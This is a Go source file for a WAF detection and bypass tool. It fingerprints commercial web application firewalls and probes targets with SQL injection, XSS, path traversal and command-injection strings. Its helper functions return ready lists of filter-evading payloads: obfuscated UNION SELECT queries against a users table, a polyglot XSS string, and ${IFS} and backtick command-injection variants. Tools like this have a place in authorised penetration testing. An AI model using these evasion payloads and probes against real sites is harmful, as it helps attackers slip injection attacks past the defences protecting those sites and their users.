// Package waf provides advanced WAF/IDS/IPS detection and bypass capabilities
package waf

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

// Detector identifies and bypasses various WAF/IDS/IPS systems
type Detector struct {
	client      *http.Client
	signatures  map[string]*WAFSignature
	mutex       sync.RWMutex
	cache       map[string]*DetectionResult
	bypassRules map[string][]BypassTechnique
}

// WAFSignature represents WAF detection patterns
type WAFSignature struct {
	Name         string
	Headers      []string
	Cookies      []string
	BodyPatterns []string
	StatusCodes  []int
	Confidence   float64
}

// DetectionResult contains WAF detection results
type DetectionResult struct {
	Detected       bool
	WAFType        string
	Confidence     float64
	BypassMethods  []BypassTechnique
	Timestamp      time.Time
	ResponseTime   time.Duration
	Fingerprints   []string
}

// BypassTechnique represents a WAF bypass method
type BypassTechnique struct {
	Name        string
	Type        string // header, payload, timing, encoding
	Success     float64
	Payload     string
	Headers     map[string]string
	Description string
}

// NewDetector creates a new WAF detector with advanced capabilities
func NewDetector() *Detector {
	return &Detector{
		client: &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: false, // Secure by default
				},
				MaxIdleConns:        100,
				MaxConnsPerHost:     10,
				IdleConnTimeout:     90 * time.Second,
				DisableCompression:  false,
			},
		},
		signatures:  initSignatures(),
		cache:       make(map[string]*DetectionResult),
		bypassRules: initBypassRules(),
	}
}

// SetInsecureSSL configures SSL verification (with warning)
func (d *Detector) SetInsecureSSL(insecure bool) {
	if insecure {
		fmt.Println("\033[33m⚠️  WARNING: SSL verification disabled. This reduces security!\033[0m")
	}
	
	transport := d.client.Transport.(*http.Transport)
	transport.TLSClientConfig.InsecureSkipVerify = insecure
}

// Detect performs comprehensive WAF detection
func (d *Detector) Detect(targetURL string) (*DetectionResult, error) {
	// Check cache first
	d.mutex.RLock()
	if cached, ok := d.cache[targetURL]; ok {
		if time.Since(cached.Timestamp) < 5*time.Minute {
			d.mutex.RUnlock()
			return cached, nil
		}
	}
	d.mutex.RUnlock()

	result := &DetectionResult{
		Timestamp:     time.Now(),
		Fingerprints:  []string{},
		BypassMethods: []BypassTechnique{},
	}

	// Multiple detection techniques
	techniques := []func(string) (bool, string, float64){
		d.detectByHeaders,
		d.detectByCookies,
		d.detectByResponse,
		d.detectByTiming,
		d.detectByPayload,
	}

	maxConfidence := 0.0
	detectedWAF := ""

	for _, technique := range techniques {
		detected, wafType, confidence := technique(targetURL)
		if detected && confidence > maxConfidence {
			result.Detected = true
			result.WAFType = wafType
			maxConfidence = confidence
			detectedWAF = wafType
		}
	}

	result.Confidence = maxConfidence

	// Get bypass methods for detected WAF
	if result.Detected && detectedWAF != "" {
		if bypasses, ok := d.bypassRules[detectedWAF]; ok {
			result.BypassMethods = bypasses
		} else {
			result.BypassMethods = d.bypassRules["generic"]
		}
	}

	// Cache result
	d.mutex.Lock()
	d.cache[targetURL] = result
	d.mutex.Unlock()

	return result, nil
}

// detectByHeaders checks HTTP headers for WAF signatures
func (d *Detector) detectByHeaders(url string) (bool, string, float64) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false, "", 0
	}

	// Add probing headers
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; WAF-Detector/1.0)")
	
	resp, err := d.client.Do(req)
	if err != nil {
		return false, "", 0
	}
	defer resp.Body.Close()

	// Check response headers against signatures
	for wafName, sig := range d.signatures {
		matches := 0
		for _, header := range sig.Headers {
			if val := resp.Header.Get(header); val != "" {
				matches++
			}
		}
		
		if matches > 0 {
			confidence := float64(matches) / float64(len(sig.Headers))
			if confidence >= 0.5 {
				return true, wafName, confidence
			}
		}
	}

	return false, "", 0
}

// detectByCookies analyzes cookies for WAF signatures
func (d *Detector) detectByCookies(url string) (bool, string, float64) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false, "", 0
	}

	resp, err := d.client.Do(req)
	if err != nil {
		return false, "", 0
	}
	defer resp.Body.Close()

	cookies := resp.Cookies()
	for wafName, sig := range d.signatures {
		for _, cookie := range cookies {
			for _, pattern := range sig.Cookies {
				if strings.Contains(cookie.Name, pattern) {
					return true, wafName, 0.8
				}
			}
		}
	}

	return false, "", 0
}

// detectByResponse analyzes response patterns
func (d *Detector) detectByResponse(url string) (bool, string, float64) {
	// Send malicious-looking payload
	testPayload := "' OR '1'='1"
	req, err := http.NewRequest("GET", url+"?test="+testPayload, nil)
	if err != nil {
		return false, "", 0
	}

	resp, err := d.client.Do(req)
	if err != nil {
		return false, "", 0
	}
	defer resp.Body.Close()

	// Check for WAF block responses
	if resp.StatusCode == 403 || resp.StatusCode == 406 {
		return true, "Generic WAF", 0.7
	}

	return false, "", 0
}

// detectByTiming uses timing analysis
func (d *Detector) detectByTiming(url string) (bool, string, float64) {
	normalTimes := []time.Duration{}
	suspiciousTimes := []time.Duration{}

	// Normal requests
	for i := 0; i < 3; i++ {
		start := time.Now()
		req, _ := http.NewRequest("GET", url, nil)
		d.client.Do(req)
		normalTimes = append(normalTimes, time.Since(start))
	}

	// Suspicious requests
	payloads := []string{"<script>", "../../etc/passwd", "' OR 1=1--"}
	for _, payload := range payloads {
		start := time.Now()
		req, _ := http.NewRequest("GET", url+"?test="+payload, nil)
		d.client.Do(req)
		suspiciousTimes = append(suspiciousTimes, time.Since(start))
	}

	// Calculate average difference
	avgNormal := averageDuration(normalTimes)
	avgSuspicious := averageDuration(suspiciousTimes)

	if avgSuspicious > avgNormal*2 {
		return true, "Rate-limiting WAF", 0.6
	}

	return false, "", 0
}

// detectByPayload sends various payloads to detect WAF
func (d *Detector) detectByPayload(url string) (bool, string, float64) {
	payloads := map[string]string{
		"sql":  "' UNION SELECT * FROM users--",
		"xss":  "<img src=x onerror=alert(1)>",
		"lfi":  "../../../../etc/passwd",
		"cmd":  "; ls -la",
	}

	blockedCount := 0
	for _, payload := range payloads {
		req, _ := http.NewRequest("GET", url+"?input="+payload, nil)
		resp, err := d.client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode >= 400 && resp.StatusCode < 500 {
			blockedCount++
		}
	}

	if blockedCount >= 3 {
		return true, "Advanced WAF", 0.9
	}

	return false, "", 0
}

// GetBypassPayload generates WAF bypass payloads
func (d *Detector) GetBypassPayload(wafType string, attackType string) []string {
	bypasses := []string{}

	switch attackType {
	case "sql":
		bypasses = append(bypasses, getSQLBypassPayloads(wafType)...)
	case "xss":
		bypasses = append(bypasses, getXSSBypassPayloads(wafType)...)
	case "cmd":
		bypasses = append(bypasses, getCmdBypassPayloads(wafType)...)
	}

	return bypasses
}

// Helper functions

func initSignatures() map[string]*WAFSignature {
	return map[string]*WAFSignature{
		"Cloudflare": {
			Name:         "Cloudflare",
			Headers:      []string{"cf-ray", "cf-cache-status", "cf-request-id"},
			Cookies:      []string{"__cfduid", "cf_clearance"},
			BodyPatterns: []string{"Cloudflare Ray ID"},
			StatusCodes:  []int{403, 503},
			Confidence:   0.95,
		},
		"AWS WAF": {
			Name:         "AWS WAF",
			Headers:      []string{"x-amzn-requestid", "x-amzn-trace-id"},
			Cookies:      []string{"AWSALB", "AWSALBCORS"},
			BodyPatterns: []string{"Request blocked"},
			StatusCodes:  []int{403},
			Confidence:   0.9,
		},
		"Akamai": {
			Name:         "Akamai",
			Headers:      []string{"akamai-origin-hop", "akamai-cache-status"},
			Cookies:      []string{"AKA_"},
			BodyPatterns: []string{"Access Denied"},
			StatusCodes:  []int{403, 503},
			Confidence:   0.85,
		},
		"ModSecurity": {
			Name:         "ModSecurity",
			Headers:      []string{"mod_security", "Mod_Security"},
			BodyPatterns: []string{"ModSecurity", "mod_security"},
			StatusCodes:  []int{403, 406, 501},
			Confidence:   0.8,
		},
		"Imperva": {
			Name:         "Imperva",
			Headers:      []string{"x-iinfo"},
			Cookies:      []string{"incap_ses", "visid_incap"},
			BodyPatterns: []string{"Incapsula"},
			StatusCodes:  []int{403},
			Confidence:   0.9,
		},
	}
}

func initBypassRules() map[string][]BypassTechnique {
	return map[string][]BypassTechnique{
		"Cloudflare": {
			{
				Name:        "Unicode Encoding",
				Type:        "encoding",
				Success:     0.7,
				Description: "Use Unicode encoding to bypass filters",
			},
			{
				Name:        "HTTP Parameter Pollution",
				Type:        "payload",
				Success:     0.6,
				Description: "Use HPP to confuse the WAF",
			},
		},
		"generic": {
			{
				Name:        "Case Variation",
				Type:        "payload",
				Success:     0.5,
				Description: "Vary case to bypass signature matching",
			},
			{
				Name:        "Time-based Evasion",
				Type:        "timing",
				Success:     0.4,
				Description: "Slow down requests to avoid rate limiting",
			},
		},
	}
}

func getSQLBypassPayloads(wafType string) []string {
	// Advanced SQL injection bypasses
	return []string{
		"/*!50000UniOn*/ /*!50000SeLeCt*/ * FrOm users",
		"un/**/ion sel/**/ect * fr/**/om users",
		"UNI%00ON SEL%00ECT * FROM users",
		"UNION/**/SELECT/**/password/**/FROM/**/users",
		"-1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
	}
}

func getXSSBypassPayloads(wafType string) []string {
	// Advanced XSS bypasses
	return []string{
		"<img src=x onerror=alert(1)>",
		"<svg/onload=alert(1)>",
		"<body/onload=alert(1)>",
		"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
		"<iframe src=javascript:alert(1)>",
	}
}

func getCmdBypassPayloads(wafType string) []string {
	// Command injection bypasses
	return []string{
		";ls${IFS}-la",
		"|ls\t-la",
		"`ls -la`",
		"$(ls -la)",
		";ls<>-la",
	}
}

func averageDuration(durations []time.Duration) time.Duration {
	if len(durations) == 0 {
		return 0
	}
	
	total := time.Duration(0)
	for _, d := range durations {
		total += d
	}
	
	return total / time.Duration(len(durations))
}

// AnalyzeTarget performs comprehensive target analysis
func (d *Detector) AnalyzeTarget(url string) map[string]interface{} {
	analysis := make(map[string]interface{})
	
	// WAF Detection
	wafResult, _ := d.Detect(url)
	analysis["waf"] = wafResult
	
	// Security Headers Check
	headers := d.checkSecurityHeaders(url)
	analysis["security_headers"] = headers
	
	// Technology Stack
	tech := d.detectTechnology(url)
	analysis["technology"] = tech
	
	return analysis
}

func (d *Detector) checkSecurityHeaders(url string) map[string]bool {
	headers := map[string]bool{
		"X-Frame-Options":         false,
		"X-Content-Type-Options":  false,
		"Content-Security-Policy": false,
		"X-XSS-Protection":        false,
		"Strict-Transport-Security": false,
	}
	
	req, _ := http.NewRequest("GET", url, nil)
	resp, err := d.client.Do(req)
	if err != nil {
		return headers
	}
	defer resp.Body.Close()
	
	for header := range headers {
		if resp.Header.Get(header) != "" {
			headers[header] = true
		}
	}
	
	return headers
}

func (d *Detector) detectTechnology(url string) map[string]string {
	tech := make(map[string]string)
	
	req, _ := http.NewRequest("GET", url, nil)
	resp, err := d.client.Do(req)
	if err != nil {
		return tech
	}
	defer resp.Body.Close()
	
	// Server detection
	if server := resp.Header.Get("Server"); server != "" {
		tech["server"] = server
	}
	
	// Powered-By detection
	if powered := resp.Header.Get("X-Powered-By"); powered != "" {
		tech["powered_by"] = powered
	}
	
	return tech
}
